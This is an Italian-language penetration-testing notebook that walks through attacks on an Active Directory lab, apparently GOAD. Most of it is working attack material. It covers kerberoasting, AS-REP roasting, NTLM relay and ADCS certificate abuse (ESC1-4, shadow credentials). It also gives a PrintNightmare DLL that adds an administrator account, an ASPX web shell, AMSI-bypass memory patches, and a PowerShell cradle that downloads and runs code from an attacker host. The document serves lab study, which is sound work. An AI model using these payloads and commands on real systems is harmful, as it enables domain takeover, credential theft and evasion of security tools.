### **SUBNET ENUM**
Inizio enumerando l'intera subnet con cme alla ricerca du samba
```bash
crackmapexec smb 192.168.56.0/24
```
![[Pasted image 20230810122313.png]]
Ora trovo gli ip dei DC per configurare /etc/hosts e capire la topologia
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```
cambia ogni volta il nome del dominio
![[Pasted image 20230810124141.png]]
quindi modifico /etc/hosts per risolvere gli indirizzi
![[Pasted image 20230810124229.png]]

### **USER ENUM (NO CREDS)**
Enumero gli user presenti su ogni macchine
```bash
crackmapexec smb 192.168.56.11 --users
```
Ha SAMRPC attivo e quindi potrò enumerare gli user
![[Pasted image 20230810163553.png]]
Ho ottenuto anche una password trovata nella descrizione negli user

Puoi anche ottenere la policy della password per provare del bruteforce
```bash
crackmapexec smb 192.168.56.11 --pass-pol
```
![[Pasted image 20230810164319.png]]
Potresti usare anche enu4linux ma non ho voglia

### **SHARE SMB (NO CREDS)**
Enumeriamo gli share di smb su cui abbiamo qualche permesso come anonimo
```bash
crackmapexec smb 192.168.56.10-23 -u 'guest' -p '' --shares
```
![[Pasted image 20230810165921.png]]
cioccato

### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
![[Pasted image 20230810171242.png]]
cracca l'hash
![[Pasted image 20230810171924.png]]

### **Password Spraying**
==OCCHIO ALLE POLICY DELLE PASSWORD PERCHE POTRESTI LOCKARE LE PASSWORD==
```bash
crackmapexec smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce
```
![[Pasted image 20230810172208.png]]
### **NTLM RELAY**
Di default windows se non riuscirà a risolvere gli hostname manderà un messaggio in broadcast su tutta la lan.

Controlliamo tra gli host se ce ne è uno con l'opzione "signing:False"
```bash
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
```
![[Pasted image 20230825154818.png]]
*responder + ntlmrelayx to smb*
Inanzitutto bisogna disabilitare smb e http su responder per poter fare il relay
```bash
sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
```
```bash
sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
```
Poi si starta ntlmrelayx
```bash
impacket-ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
```
e responder
```bash
sudo responder -I tun0
```

### **USER ENUM(W\ CREDS)**
Per ottenere tutti gli User di un dominio avendo un account a disposizione
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
```
![[Pasted image 20230825105044.png]]

### **KERBEROASTING (SPN)**
Proviamo a vedere se c'è qualche SPN settato e con l'hash in chiaro (Cosa che capita spesso)
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```
![[Pasted image 20230825112141.png]]
Gli hash di questi due utenti sono stati inseriti nel file kerberoasting.hashes (opzione -outpoutfile)

Puoi usare anche crackmapexec per farlo
```bash
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

Cracca gli hash
```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20230825114831.png]]
Solo un hash è stata craccata

### **AD ENUM (BLOODHOUND)**
Ora che abbiamo trovato delle credenziali per accedere possiamo fare un enumerazione dell'ad tramite bloodhound e trovare i vari path per gli account
```bash
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
```
Passa l'exe ed avvialo, enumerando tutti e 3 i domain
```bash
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
```

### **SamAccountName (NoPac) CVE-2021-42287**
Per questo passaggio scarica
[GitHub - dirkjanm/krbrelayx: Kerberos unconstrained delegation abuse toolkit](https://github.com/dirkjanm/krbrelayx)
impacket-renameMachine.py
impacket-getST.py

Vediamo il machine account quota (Quanti computer puoi aggiungere al domain) dell'account trovato con il kerberoasting
```bash
crackmapexec ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```
![[Pasted image 20230825161202.png]]
Ora aggiungiamo il nuovo computer al domain
```bash
impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```
![[Pasted image 20230825162234.png]]
Ora puliamo l'SPNs del nuovo computer
```bash
python3 addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```
![[Pasted image 20230825164134.png]]
Rinominiamo il computer a DCl (Da qui in poi non sono riuscito a fare l'exploit)
```bash
python3 renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```
![[Pasted image 20230825170216.png]]
```bash
impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```
![[Pasted image 20230825170322.png]]
```bash
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```
![[Pasted image 20230825170418.png]]
```bash
export KRB5CCNAME=/workspace/winterfell.ccache
```
```bash
impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```
![[Pasted image 20230825170523.png]]
```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```
```bash
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```
![[Pasted image 20230825170548.png]]

### **PrintNightmare**
Inanzitutto controlliamo se spooler è attivo
```bash
crackmapexec smb 192.168.56.10-23 -M spooler
```
![[Pasted image 20230825171651.png]]
o
```bash
impacket-rpcdump @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
```
![[Pasted image 20230825171815.png]]
Crea l'exploit nightmare.c
```c
#include <windows.h> 
int RunCMD()
{
    system("net users pnightmare Passw0rd123. /add");
    system("net localgroup administrators pnightmare /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
e compilalo
```bash
x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
```
clona l'exploit dalla repository
```bash
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
```
avvia una share smb
```bash
impacket-smbserver -smb2support ATTACKERSHARE .
```
continua quando possibile (part5)
### **ADCS RECON AND ENUM(CON CREDS)**
Si può fare con due tool principalmente, ma inizialmente va usato certipy per ottenere lo zip da inserire in bloodhound
```bash
certipy-ad find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
```
![[Pasted image 20230828125307.png]]
*Certipy*
Usando certipy e l'opzione "-vulnerable" è possibile ottenere informazioni sui template e i permessi vulnerabili
```bash
certipy-ad find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
```
![[Pasted image 20230828125806.png]]
![[Pasted image 20230828144854.png]]
![[Pasted image 20230828144917.png]]
![[Pasted image 20230828144930.png]]

*BloodHound*
Carica il file zip e  vai in PKI -> Find certificate authority -> see enabled template
### **ESC 1 - ADCS**
Richiedi il certificato tramite certipy
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```
![[Pasted image 20230828145911.png]]
Usando poi il certificato ottieni l'hash dell'amministratore
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
```
![[Pasted image 20230828150041.png]]
### **ESC 2 & 3 - ADCS**
Prendi il certificato usando certipy
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
```
![[Pasted image 20230828150256.png]]
Ora usa il certificato ottenuto per scaricare il certificato dell'amministratore
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
![[Pasted image 20230828150815.png]]
Ora usando il suo certificato prendi l'hash
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
```
![[Pasted image 20230828150913.png]]
### **ESC 4 - ADCS**
Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
```bash
certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
```
![[Pasted image 20230828151521.png]]
Poi exploitalo come ESC1.
Per riportarlo alla normalità
```bash
certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
![[Pasted image 20230828151547.png]]
### **ESC 8 - ADCS**

Da fare
### **CVE-2022-26923**
[Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
Crea un account con un domain user e setta un nome fake del dns come domain controller
```bash
certipy-ad account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
```
Da fare
### **Shadow Credentials**
[Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
Stealth e molto utile in caso di vero pentest.
Ha bisogno dell'opzione msDS-KeyCredentialLink abilitata sull'account (Se hai genericWrite o genericAll su un account puoi abilitarla da solo)
```bash
certipy-ad shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
```
![[Pasted image 20230828173854.png]]

### **ENUM MSSQL**
Vediamo quali server hanno MSSQL attivo
```bash
nmap -p 1433 -sV -sC 192.168.56.10-23
```
![[Pasted image 20230830110346.png]]
![[Pasted image 20230830110835.png]]
Controlliamo se ci sono utenti con SPN sui server MSSQL trovati
```bash
impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
![[Pasted image 20230830104754.png]]
```bash
GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
![[Pasted image 20230830110943.png]]
è possibile anche usare crackmapexec per enumerare
```bash
crackmapexec mssql 192.168.56.22-23
```
![[Pasted image 20230830151845.png]]

### **MSSQL PWN**
Non funziona
### **IIS Rev Shell**
All'indirizzo http://192.168.56.22/Default.aspx c'è un web server IIS che consente un upload.
Carichiamo quindi una web shell in .asp.
```aspx
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <% 
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
```
![[Pasted image 20230906101505.png]]
Ora abbiamo ottenuto una reverse shell
![[Pasted image 20230906104623.png]]

### **IIS Priv Esc**
*AMSI Bypass*
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
[amsi.fail](https://amsi.fail/)
Io ho usato una versione modificata di quelli trovabili in questi due link
```PowerShell
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```
Di seguito uno script per disabilitare totalmente AMSI a livello .NET
```PowerShell
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
Apriamo un server http e lanciamolo sulla macchina windows
```PowerShell
(new-object system.net.webclient).downloadstring('http://192.168.56.6:8080/amsi_rmouse.txt')|IEX
```
![[Pasted image 20230906110016.png]]
==ORA NON TOCCARE PIù IL DISCO ALTRIMENTI MANDI TUTTO A DONNINE==
Per runnare gli script runnali direttamente in memoria quando li scarichi
*WinPeas senza toccare il disco*
Per approfondimento
[Running a .NET Assembly in Memory with Meterpreter - (praetorian.com)](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter/)

Prendi WinPeas e lancialo in memoria
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
```
```powershell
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.6:8080/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```
![[Pasted image 20230906111136.png]]
*SeImpersonatePrivilege to Authority\system*
Qui si possono usare svariate tecniche "Potato". Per approfondimenti
[https://jlajara.gitlab.io/Potatoes_Windows_Privesc](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
